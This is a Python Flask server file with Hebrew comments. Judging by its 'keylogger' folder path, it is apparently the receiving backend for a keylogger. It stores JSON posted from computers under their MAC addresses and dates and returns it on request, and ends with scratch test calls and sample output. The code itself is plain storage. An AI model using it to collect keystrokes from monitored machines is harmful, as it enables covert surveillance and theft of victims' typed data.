import flask
from flask import Flask
import os
import json
import datetime
app = Flask(__name__)
data_file = r"C:\Users\1\Desktop\keylogger\server_data\computers"



def load_data(mac_address=None, date=None, root_directory=data_file):

        all_data = {}

        # בדיקה שהתיקייה הראשית קיימת
        if not os.path.exists(root_directory):
            return all_data

        for mac in os.listdir(root_directory):
            mac_path = os.path.join(root_directory, mac)
            if not os.path.isdir(mac_path):
                continue

            if mac_address is not None and mac != mac_address:
                continue

            mac_data = {}  # מילון לאחסון הנתונים עבור MAC זה

            # מעבר על כל הקבצים בתיקיית ה-MAC (מחפשים קבצי JSON)
            for filename in os.listdir(mac_path):
                if not filename.endswith(".json"):
                    continue
                # הסרת הסיומת כדי לקבל את התאריך
                file_date = os.path.splitext(filename)[0]

                # אם סופק date והשם (התאריך) לא תואם, דלג
                if date is not None and not file_date.startswith(date):
                    continue

                file_path = os.path.join(mac_path, filename)
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    mac_data[file_date] = data
                except json.JSONDecodeError:
                    continue

            if mac_data:
                all_data[mac] = mac_data

        return all_data






def merge_dicts_recursive(d1, d2):
    merged = d1.copy()

    for key, value in d2.items():
        if key in merged:
            if isinstance(merged[key], dict) and isinstance(value, dict):
                # מיזוג רקורסיבי של שני מילונים
                merged[key] = merge_dicts_recursive(merged[key], value)
            elif isinstance(merged[key], dict) or isinstance(value, dict):
                # אם אחד הוא מילון והשני לא – משאירים את הערך הישן
                continue
            else:
                # אם שניהם לא מילונים – מחליפים
                merged[key] = value
        else:
            merged[key] = value
    return merged

def save_new_data(data):
    mac_address = (next(iter(data)))
    date = datetime.datetime.now().strftime("%Y-%m-%d__%H-%M")
    old_data=load_data(mac_address=mac_address , date=date)
    path = data_file + rf'\{mac_address}'
    new_data = merge_dicts_recursive(data,old_data)
    if not os.path.exists(path):
        os.makedirs(path)
    with open(path+rf"\{date}.json" , "w" , encoding='utf-8') as file:
        json.dump(new_data , file , indent=4 , ensure_ascii=False)



@app.route('/<computers>/<mac_address>/<date>',methods=['POST'])
def upload_data(computers,mac_address,date):
    new_data = flask.request.json
    if not new_data:
        return flask.jsonify({'error':"do not get data"}),400
    save_new_data(new_data)
    return flask.jsonify({'message':'save successfully'}),200


@app.route('/<computers>/<mac_address>/<date>',methods=['GET'])
def get_data(computers,mac_address=None,date=None):
        if not computers:
            return flask.jsonify({'error': 'must get -computers-'}), 400

        data = load_data(mac_address=mac_address, date=date)

        return flask.jsonify(data), 200



@app.route('/health',methods=['GET'])
def health():
    return flask.jsonify({'status':'server active'}),200

if __name__ == '__main__':
    app.run(debug=True)


print(load_data('128','88'))
mac_address = 'bbb'
a = data_file + rf'\{mac_address}'
print(a)
data = {'44':"45"}
print("aaaaaaa")
print((next(iter(data))))

save_new_data(data)
print(load_data())
{'128': {'12-3': {'44': {'1255': '88'}}}, '44': {'2025-02-19_18-06': {'44': '45'}, '2025-02-19_18-10': {'44': '45'}, '2025-02-19__18-10': {'44': '45'}, '2025-02-19__18-11': {'44': '45'}}}